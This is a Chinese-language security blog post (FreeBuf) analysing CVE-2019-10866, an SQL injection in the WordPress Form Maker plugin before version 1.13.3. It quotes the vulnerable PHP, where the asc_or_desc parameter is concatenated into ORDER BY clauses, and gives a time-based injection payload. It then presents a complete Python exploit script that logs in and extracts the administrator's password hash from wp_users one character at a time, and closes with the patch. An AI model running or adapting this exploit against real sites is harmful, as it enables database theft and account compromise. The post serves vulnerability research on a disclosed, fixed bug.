@@ -1,0 +1,179 @@
+***本文中涉及到的相关漏洞已报送厂商并得到修复，本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。**
+
+ ***本文原创作者：Kriston，本文属FreeBuf原创奖励计划，未经许可禁止转载**  
+
+**最近WordPress的插件出现各种姿势漏洞（都是插件，不知何时能有核心漏洞出现），Easy WP SMTP、 Social Warfare、Form
+Maker等等，其中Form
+Maker1.13.3之前版本存在sql注入漏洞（CVE-2019-10866）。最近一直在看cms的漏洞代码，于是顺手在网上找了该插件的影响版本与修补后的版本进行了代码分析，并且在本地对该漏洞进行了分析复现和POC代码编写调试。下面是分析和复现的过程：**
+
+> 本地环境：Wordpress5.1 + Form Maker1.13.3
+
+在本地搭建WordPress5.1版本，然后上网找一下FormMaker的历史版本。安装的时候选择上传安装，有可能会有上传大小限制，需要改一下php.ini中的配置信息。安装完成后记得要把自动更新关掉，要把自动更新关掉，要把自动更新关掉，重要的事情说三遍。然后就可以专心的进行代码审计和漏洞复现了。
+
+> 漏洞位置：\wp-content\plugins\form-maker\admin\models\Submissions_fm.php
+
+在cve的信息中作者提到在该路径下的php文件存在问题，直接定位文件进行审计。
+
+    
+    
+        ...
+        $order_by = WDW_FM_Library(self::PLUGIN)->get('order_by', 'group_id');
+        $asc_or_desc = WDW_FM_Library(self::PLUGIN)->get('asc_or_desc', 'desc'); 
+        ...
+        if ( $order_by == 'group_id' or $order_by == 'date' or $order_by == 'ip' ) {
+          $orderby = ' ORDER BY ' . $order_by . ' ' . $asc_or_desc . '';
+        }
+        else if ( $order_by == 'display_name' or $order_by == 'user_email' ) {
+          $orderby = ' ORDER BY (SELECT ' . $order_by . ' FROM ' . $wpdb->prefix . 'users WHERE ID=user_id_wd) ' . $asc_or_desc . '';
+        }
+        else {
+          $orderby = "";
+        }
+
+在上述代码中存在问题的位置：
+
+    
+    
+    $asc_or_desc = WDW_FM_Library(self::PLUGIN)->get('asc_or_desc', 'desc'); 
+    
+        ...
+    
+        if ( $order_by == 'group_id' or $order_by == 'date' or $order_by == 'ip' ) {
+    
+          $orderby = ' ORDER BY ' . $order_by . ' ' . $asc_or_desc . '';
+    
+        ...
+
+代码中对所有的参数都有判断检测，唯独对$asc_or_desc参数什么都没做，把传进来的参数直接和查询语句拼接在了一起（危险警告）。再看一下其他位置有没有类似的危险操作，或者上下文调用中是否对这个参数有检测（拼接前都没有估计其他位置也不能有了）？
+
+对整个插件工程全文搜索$asc_or_desc，继续寻找。
+
+> 漏洞位置：\wp-content\plugins\form-maker\admin\controllers\Submissions_fm.php
+    
+    
+        ...
+        $group_ids = ((isset($labels_parameters[6])) ? $labels_parameters[6] : NULL);
+                 $params['group_id_s'] = $this->model->sort_group_ids(count($params['sorted_label_names']), $group_ids);
+                 $params['where_choices'] = $labels_parameters[7];
+                 $params['searched_ids'] = $labels_parameters[8] ? implode(',', $labels_parameters[8]) : '';
+                 $params['groupids']	= $labels_parameters[8] ? array_reverse($labels_parameters[8]) : array();
+                 $params['order_by']   	= $order_by = WDW_FM_Library(self::PLUGIN)->get('order_by', 'group_id');
+                 $params['asc_or_desc'] = $asc_or_desc  = WDW_FM_Library(self::PLUGIN)->get('asc_or_desc', 'desc');
+        ...
+        if ( !empty($_POST['order_by']) || !empty($_POST['asc_or_desc']) ) {
+            $is_sort	= true;
+            $order_by	= $_POST['order_by'];
+            $asc_or_desc = $_POST['asc_or_desc'];
+        ...
+        Foreach ( $lists as $list_key => $list_val ) {
+        If ( !Empty($_GET[$list_key]) ) {
+            $lists[$list_key] = urlencode(WDW_FM_Library(self::PLUGIN)->get($list_key));
+            $pagination_url_args[$list_key] = WDW_FM_Library(self::PLUGIN)->get($list_key);
+            $pagination_url_args[‘is_search’] = 1;
+            }
+        }
+        $pagination_url = array_merge(rray(‘page’ => $this->page, ‘task’ => ‘display’, ‘current_id’ => $id, ‘order_by’ => $order_by, ‘asc_or_desc’ =>                                     $asc_or_desc),pagination_url_args);
+        params[‘pagination_url’]  = add_query_arg( $pagination_url , admin_url(‘admin.php’) );
+
+危险警告X2
+
+    
+    
+    $params['asc_or_desc'] = $asc_or_desc  = WDW_FM_Library(self::PLUGIN)->get('asc_or_desc', 'desc');
+    
+    ...
+    
+        if ( !empty($_POST['order_by']) || !empty($_POST['asc_or_desc']) ) {
+    
+        $is_sort	= true;
+    
+        $order_by	= $_POST['order_by'];
+    
+        $asc_or_desc = $_POST['asc_or_desc'];
+    
+        ...
+    
+        $pagination_url = array_merge(rray('page' => $this->page, 'task' => 'display', 'current_id' => $id, 'order_by' => $order_by, 'asc_or_desc' => $asc_or_desc),pagination_url_args);
+
+发现参数‘asc_or_desc’，代码中同样没有对该参数进行过滤或是合法性的判断（不能相信用户任何的输入）。
+
+通过以上两个漏洞的位置大致可以知道sql注入的产生原因了，可利用$asc_or_desc参数构造sql注入，形如：
+
+    
+    
+    ,(case+when+(select+sleep(5)+from+wp_user+limit+1)+then+1+else+2+end)+asc+--+
+
+在这之前还要解决一个重要的问题就是找到传参的位置，简单的办法就是在本地搭建的环境中使用产生漏洞插件的各种功能，查看每个功能传的参数，如图：
+
+![1.PNG](https://image.3001.net/images/20190605/1559703170_5cf72e82de74a.png!small)
+
+根据该漏洞路径，参照Daniele Scanu @ Certimeter
+Group的漏洞利用脚本，可对WordPress数据库进行查询，最终注入脚本如下，以查询wp_user中用户密码为例：
+
+### 注入脚本：
+
+    
+    
+    import requests
+    import time
+    url_vuln = 'http://ip/wordpress/wp-admin/admin.php?page=submissions_fm&task=display&ampcurrent_id=2ℴ_by=group_id&group_id&asc_or_desc='  #group_id&group_id&asc_or_desc='
+    session = requests.Session()
+    dictionary = '@._-$/\\"￡%&;§+*1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'
+    flag = True
+    username = ""
+    password = ""
+    temp_password = ""
+    TIME = 1
+    def login(username, password):
+        payload = {
+            'log': username,
+            'pwd': password,
+            'wp-submit': 'Login',
+            'redirect_to': 'http://ip/wordpress/wp-admin/',
+            'testcookie': 1
+        }
+        session.post('http://ip/wordpress/wp-login.php', data=payload)
+    def print_string(str):
+        print "\033c"
+        print str
+    def get_admin_pass():
+        len_pwd = 1
+        global flag
+        global temp_password
+        while flag:
+            flag = False
+            ch_temp = ''
+            for ch in dictionary:
+                print_string("[*] Password dump: " + temp_password + ch)
+                ch_temp = ch
+                start_time = time.time()
+                r = session.get(url_vuln + ',(case+when+(select+ascii(substring(user_pass,' + str(len_pwd) + ',' + str(len_pwd) + '))+from+wp_users+where+id%3d1)%3d' + str(ord(ch)) + '+then+(select+sleep(' + str(TIME) + ')+from+wp_users+limit+1)+else+2+end)+asc%3b')
+                elapsed_time = time.time() - start_time
+                if elapsed_time >= TIME:
+                    flag = True
+                    break
+            if flag:
+                temp_password += ch_temp
+                len_pwd += 1
+    login(username, password)
+    get_admin_pass()
+    print_string("[+] Password found: " + temp_password)
+
+注意：因网络原因需要设置合理的TIME时长
+
+### 本地运行结果：
+
+![2.PNG](https://image.3001.net/images/20190605/1559695098_5cf70efaadb73.png!small)![1.PNG](https://image.3001.net/images/20190605/1559695110_5cf70f06c325c.png!small)利用脚本可查询当前网站下用户所有敏感数据。
+
+### 修补方式：
+
+在1.13.3版本以后，该插件对参数$asc_or_desc进行了严格的限制。
+
+![1.PNG](https://image.3001.net/images/20190605/1559695545_5cf710b90e99e.png!small)![2.PNG](https://image.3001.net/images/20190605/1559695547_5cf710bb6558c.png!small)
+
+在最近的cms代码审计学习中也发现了一些应为过滤审核不严导致的sql注入漏洞，在代码编写的过程中万万不可相信用户任何的输入，需要严格的过滤审核才能带入到程序中运行，否则就会产生安全隐患。
+
+以上。
+
+ ***本文原创作者：Kriston，本文属FreeBuf原创奖励计划，未经许可禁止转载**
+
